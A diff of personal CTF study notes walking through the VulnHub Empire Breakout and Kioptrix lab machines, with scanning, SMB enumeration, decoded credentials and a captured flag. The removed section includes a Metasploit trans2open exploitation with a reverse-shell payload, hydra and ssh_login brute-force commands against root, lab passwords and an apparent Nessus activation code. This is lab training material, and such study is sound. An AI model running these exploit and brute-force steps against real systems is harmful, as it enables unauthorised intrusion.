@@ -3,8 +3,13 @@
 
                     Empire Breakout 
 				 -----------------------
+https://medium.com/@the.opemi.aa/walk-through-vulnhub-empire-breakout-c36a43ab4b46				 
 				 
-			The  ip appears on start up screen 	 192.168.1.205
+The machine will automatically be assigned an IP address from the network DHCP. It will be visible on the login screen. The target machine's IP address can be seen in the following screenshot. 		
+
+DHCP: The Dynamic Host Configuration Protocol:a network management protocol used on Internet Protocol (IP) networks for automatically assigning IP addresses and other communication parameters to devices connected to the network using a client–server architecture.[
+		 
+The  ip will appear  on start up screen . 	 192.168.1.205
 1. try to run ping 192.168.1.205 
  
 2.  sudo  netdiscover -r  192.168.1.0/24
@@ -16,12 +21,19 @@
      PORT      STATE SERVICE     REASON  VERSION
      80/tcp    open  http        syn-ack Apache httpd 2.4.51 ((Debian))
                       |_http-server-header: Apache/2.4.51 (Debian)
+ 
+
+     993/tcp   open  tcpwrapped  syn-ack
+     995/tcp   open  tcpwrapped  syn-ack
+1    10000/tcp open  http        syn-ack MiniServ 1.981 (Webmin httpd 
      20000/tcp open  http        syn-ack MiniServ 1.830 (Webmin httpd)
 |       http-methods: 
 |         _  Supported Methods: GET HEAD POST OPTIONS
 
      you can also run 
 	    nmap -p80,139,445,10000,20000 -A 192.168.1.205
+		
+		
  
  4. since we found port 80 there is  aserver so we can open it 
     you cant open firefox on http://192.168.1.205/  
@@ -36,9 +48,9 @@ don't worry no one will get here, it's safe to share with you my access. Its enc
 
 
 -->
-
-
-5. move to  https://www.dcode.fr/brainfuck-language
+5.   scan all dir of the server 
+       dirb http://192.168.1.205
+6. move to  https://www.dcode.fr/brainfuck-language
    input the string and the Passward is:
       .2uqPEfj3D<P'a-3
 
@@ -53,404 +65,13 @@ don't worry no one will get here, it's safe to share with you my access. Its enc
   	  
 	  in firefox goto: http://192.168.1.205:20000
 	      and input user=cyber   passward = .2uqPEfj3D<P'a-3
-	  
- ip a:  List all all connections.
- ip n:
- ip route:  where the traffic is routing
- 
- arp -a: Displays the current ARP table for all interfaces. Address Resolution Protocol (ARP) table. 
- 
- arp-scan:  identify active devices on a network. 
-     arp-scan --localnet:  scan the entire local network. 
-
-  netdiscover -r 10.0.2.0/24
- nbtscan 10.40.1.120 : providing information  about NetBIOS like NetBIOS name and the User ,services  
-	 
- 
- ifconfig: showes only the ethernet connections(hardwired connection)
- iwconfig: shows only wireless connection
- ping:
- netstat: displays active connections and ports
- route
+8. on the left lower part of the screen there is a console button	
+   press the button  and run 'ls' . you will find a file named 'user.txt'
+   run 'cat user.txt' and you will  find the flg  
    
- https://www.youtube.com/watch?v=3FNYvj2U0HM
- 
- 
- starting services 
- ----------------
- sudo service apache2 start: starting the apache server
- get the ip address of the local computer and input it as a url in the browser.
- The index.html of the server is :/var/www/html/index.html
- sudo service apache2 stop: stoping  the apache server.
- 
- python webserver
- python3 -m http.server 80
- get the ip address of the local computer and input it as a url in the browser.
- it will show you the file directory of your system .
- 
- 
- sudo systemctl enable ssh :enable ssh on mechine startup 
- sudo systemctl disable ssh: disable ssh on mechine startup
- 
- 05:23:08  port_scanner.py
- 
- 
- https://www.bugcrowd.com/programs    
- https://bugcrowd.com/engagements?category=bug_bounty&page=1&sort_by=promoted&sort_direction=desc
-
- tesla
---------------
-https://bugcrowd.com/engagements?category=bug_bounty&sort_by=promoted&sort_direction=desc&search=tesla&page=1
- 
- Email 
- https://kodkodcyber.com/recon-ng/
- 
- https://hashes.com/en/decrypt/hash
- 
- 
- 
- part 2
- https://www.youtube.com/watch?v=sH4JCwjybGs
- virtual machine: https://www.vulnhub.com/
- in oracle chose tool    add new network  'net network' and give it a name
-  change network of  each vm to that net network and chose the   name
-
-kioptrix
-
-
-https://dev.to/babsarena/kioptrix-level-1-walkthrough-27jg
-
-login:  john  
-passward: TwoCows2
-1. in kioptrix run  ping 8.8.8.8 -c1
-   The IP addres  is the IP address of kioptrix machine: 10.0.2.4
-
-
-2. Anothe r way to discover the IP is :
-     netdiscover -r 10.0.2.0/24
- 
-   output:
-   ------------------------------   
-  Currently scanning: Finished!   |   Screen View: Unique Hosts               
-  Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180             
-  _____________________________________________________________________________
-    IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
-  -----------------------------------------------------------------------------
-   10.0.2.2        52:54:00:12:35:02      1      60  Unknown vendor            
-   10.0.2.3        52:54:00:12:35:03      1      60  Unknown vendor            
-   10.0.2.4        52:54:00:12:35:04      1      60  Unknown vendor 
-   --------------------------------------
-   
-   we can assume that the IP is  10.0.2.4   
-3. Lets check that
-  sudo  nbtscan 10.0.2.4
-  output:
-        =======================================
-		Doing NBT name scan for addresses from 10.0.2.4
-
-		IP address       NetBIOS Name     Server    User             MAC address      
-		------------------------------------------------------------------------------
-		10.0.2.4         KIOPTRIX         <server>  KIOPTRIX         00:00:00:00:00:00
-        ==================================
-
-   so  10.0.2.4  is the ip of KIOPTRIX
-
-4. Now that we know the IP address of the machine, we run an NMAP SCAN on the machine from our 
- LINUX machine to determine any open ports using the syntax:
-    nmap  -T4 -p-  -A  10.0.2.4 
-
- From the nmap scan results, we can learn that the open ports are :
- 
-     PORT      STATE SERVICE     VERSION
-     ====================================
-     22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
-	 80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
-     111/tcp   open  rpcbind     2 (RPC #100000)
-     139/tcp   open  netbios-ssn Samba smbd (workgroup: 1MYGROUP)
-     443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
-     32768/tcp open  status      1 (RPC #100024)
-	 
-     MAC Address: 08:00:27:DF:A3:F2 (Oracle VirtualBox virtual NIC)
-
-  From the nmap scan it can be seen that kioptrix is a linux machine running
-  Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b),  
- 
- 
- So now it is our job to look up the information of the open port and find expolits
- 
- 5. Navigate to the website
-     In fire fox got to setting/network setting and chose: "use system proxy settings"
-     in firefox goto to the URL  of our target " http://10.0.2.4 "
-	 
-	 
-	 
-	 
- 01:019:00   enumerating ports
- 
- 6. run nikto -h  http://10.0.2.4 
-   The ouptut is a long list of problem with the server.
- 7 dirbuster &
-    navigate to /usr/share/wordlists/dirbuster
-	and chose  file 'directory-list-2.3-small.txt'.
-	since we know that the server uses Apache, change extension to php.
-	You can add more extensions like txt,zip,rar,pdf,docx.... but this will 
-	increase the time.
- 
- 8.In  run  burpsuite
-    in firefox goto settings/Network Settings  (on the bottom )
-    chose manual proxy
-		   switch from:   'Use system proxy settings' 
-		            to:   'use manul proxy' 127.0.0.1 port 8080
- 
-  01:34:00  
-  
-  
-            enumerating SMB   port 139 (file share)
-         SMB Server Message Block: protocol used to share files 
-           -------------------------------
- 
- 
- 9.  msfconsole
- 
-     search smb
-	 output: A long list but the importent option is:
-	           111  auxiliary/scanner/smb/smb_version
- 9.1   at the prompt write:  use auxiliary/scanner/smb/smb_version   
-	[msf](Jobs:0 Agents:0)   >>     use auxiliary/scanner/smb/smb_version
-    [msf](Jobs:0 Agents:0)          auxiliary(scanner/smb/smb_version) >> 
- 9.2 At the prompt write: info 
- 9.3 At the prompt write: set RHOSTS  10.0.2.4
-       output: RHOSTS => 10.0.2.4
- 9.4 run
-  output:
-   
-     [*] 10.0.2.4:139          - SMB Detected (versions:) (preferred dialect:) (signatures:optional)
-     [*] 10.0.2.4:139          -   Host could not be identified: Unix (Samba 2.2.1a)
-     [*] 10.0.2.4:             - Scanned 1 of 1 hosts (100% complete)
-     [*] Auxiliary module execution completed
-
-  9.5 we can see the smb version  (Samba 2.2.1a)
-  
-   01:44:50  
-  
- 10.  smbclient  try to connect to the file share
-     smbclient  -L \\\\10.0.2.4\\
-    output:
-	  Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
-      Anonymous login successful
-      Password for [WORKGROUP\burguli]:
-   since we don't no the passward just press enter .
-  
-  output:
-  -----------------------------------------
-   Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
-   Anonymous login successful
-   Password for [WORKGROUP\burguli]:
-
-	Sharename       Type      Comment
-	---------       ----      -------
-	IPC$            IPC       IPC Service (Samba Server)
-	ADMIN$          IPC       IPC Service (Samba Server)
-  Reconnecting with SMB1 for workgroup listing.
-  Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
-   Anonymous login successful
-
-	Server               Comment
-	---------            -------
-	KIOPTRIX             Samba Server
-
-	Workgroup            Master
-	---------            -------
-	MYGROUP              KIOPTRIX
-------------------------------End of output
-  
-  We cand see there are two file shares: IPC$,  ADMIN$
-  run:
-  smbclient   \\\\10.0.2.4\\ADMIN$
-output:
-   Password for [WORKGROUP\itom]:
-   press enter
- output:  
-   Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
-  Anonymous login successful
- tree connect failed: NT_STATUS_WRONG_PASSWORD
- so we can't connect 
-
- run :   smbclient   \\\\10.0.2.4\\IPC$ 
-   Password for [WORKGROUP\itom]:
- press Enter and now we are in.
- you can run help but there is no acses here.
- so we are in a dead end.
-  
-  
-  01:53:12 https://www.youtube.com/watch?v=sH4JCwjybGs
- 
-
- 11.    Reserching Potential Vulnerabilities in the internet 
-  ===================================
-  on google look for samba 2.2.1a exploit  
-   and open: https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open/
-  
-   According to the document there is a  Vulnerabilit to trans2open
-   https://www.exploit-db.com/exploits/7
-   https://www.exploit-db.com/exploits/10
-   
-12. 
-      Reserching Potential Vulnerabilities in the local system   
-          -------------------------------------
-	 install searchsploit
-	  sudo git clone https://gitlab.com/exploit-database/exploitdb /opt/exploitdb
-      sudo ln -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit
-    
-	  To look for samba 2.2.1a exploit
-      run:  searchsploit  samba 2
-	  output  a long list of possible explotations
-   
-   
- 13. Scanning w/ Nessus part 1  ( proprietary vulnerability scanner )
-   install  Nessus: https://www.geeksforgeeks.org/linux-unix/how-to-install-nessus-on-linux/
-    13.1 download the file from
-	    https://www.tenable.com/downloads/nessus?loginAttempted=true
-    13.2 cd download
-	13.3 run: dpkg   -i  Nessus-10.9.3-ubuntu1604_amd64.deb
-       output:
-	    You can start Nessus Scanner by typing /bin/systemctl start nessusd.service
-        - Then go to  
-                      https://localhost:8834  to configure your scanner
-		   
-           Activation Code: 8PRL-S57J-67DC-JNQJ-HVTH
-           itom  lus  
-		   uninstall Nessus
-		   --------------
-	    13.3.1: linux  
-	             sudo service nessusd stop
-	             sudo dpkg -r Nessus
-	    
-	       windows
-	        
-	          open search window and serach for  for services.  start as a manger and navigate to 'Tenable Nessus'
-		    open it's properties and change startup to "manual", now it won't start on startup. Download my .bat files and you are good to go!  (Don't forget to run them as admin)
-		   
-		   
-		   
-         
-
-
-     13.4   start the Nessus service:                         sudo systemctl start nessusd
-           Verify that the service is running by running:     sudo systemctl status nessusd  
-           If it is disabled then run enable it:              sudo systemctl enable nessusd
-           Now check whether it is enabled or not.            sudo systemctl status nessusd : 
-           
-           running:  
-                    https://localhost:8834 
-           
-    13.5 using 
-          Click on the "Scans" tab in the top navigation bar.
-          Create a New Scan
-          Select the "Basic Network Scan" template.
-          In the "Targets"  IP   or hostname  
-          Start the Scan
-          
- 
- 
- 
- 
-    shall:   access to a machine 
-   
-   reverse shall  (the usual    method)
-    --------------------
-    the target machine connect to us
-   
-   bind shall
-   ---------------
-   we open a port in the target computer and we connect to it. and it is listing to us to connect 
- 02:40:00 
- 
- 
-  Geting Root w/ metasploit
- --------------------------------------------------
-  run   searchsploit    samba 2.2  
-      in the output list you will  find many strings 'trans2open'
- 1.run msfconsole  
- 2.inside msfconsole  write search trans2open
- 3.use 1
- 4.options
- 5.set   rhosts  10.0.2.4 # the remote host we are attaking 
- 6 show targets
- 7. exploit
- output: many messages of the fromat '10.0.2.4 - Meterpreter session 1 closed.  Reason: Died'
- 8. Ctrl + C
- 9. set payload linux/x86/   and double tab 
-    output: A list of Payloads 
- 10. chose   set payload linux/x86/shell_reverse_tcp	
- 11. run
- 12  write whoami and the answer is root
-     write hostname the answer is kioptrix.level1
-==========================================================
- 
- 
- 02:45:00 manual explotation
-  OpenLuck
-install insrtuctios: https://github.com/heltonWernik/OpenLuck
-
-
-                ----------       Brute force attacks     -------------
-  02:59:00
-  
-  1.ls -la  /usr/share/metasploit-framework/data/wordlists
-  there is a long list of file that contains passward fo verios systems
-   we will chose unix_passwords.txt
-
-  hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://10.0.2.4:22 -t 4 -V
-  does not work
-  2  msfconsole
-     search ssh
-	 output:  11  auxiliary/scanner/ssh/ssh_login    normal     No     SSH Login Check Scanner
-	  use    auxiliary/scanner/ssh/ssh_login
-	  at the prompt write : options
-	  write:  set username root
-              set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
-			  set rhosts 10.0.2.4
-			  set threads 10
-			  set verbose true
-			  run
+   $ cat user.txt
+    3mp!r3{You_Manage_To_Break_To_My_Secure_Access}
 	
-     it will sand passward for root login but there is no success.	
-	 
- 
-  
- 04:16:00
- 
-  
-  
-  https://www.youtube.com/watch?v=sH4JCwjybGs     03:21:00 
-  
-  
- Demo Report
- --------------------
- 80/443 http://10.0.2.4
- default webpage - Apache - php
- Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
- ssh: OpenSSH 2.9p2 (protocol 1.99)  
- SMB version: unix  (Samba 2.2.1a)
- mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vlunrable to remote buffer 
-     overflow. which allow remote shall
- 
- Information disclosure - 404 page http://10.0.2.4/manual/index.html
-       http://10.0.2.4/manual/- directory                   
-  nikto -h  http://10.0.2.4 output
-  + mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow 
-  which may allow a remote shell.
-
-
-
-
-
-
-
- in case "SSL_ERROR_NO_CYPHER_OVERLAP” Error
-	  changeyour browser’s privacy settings.
-	 To do so, open your Firefox menu, then navigate to Options > Privacy & Security:
-	 navigate to Security section(At the bottm of the page)
-	 Under the Security section, deselect Block dangerous and deceptive content:
-	 
+9. run the nnext commands
+    whoami : 	
+   
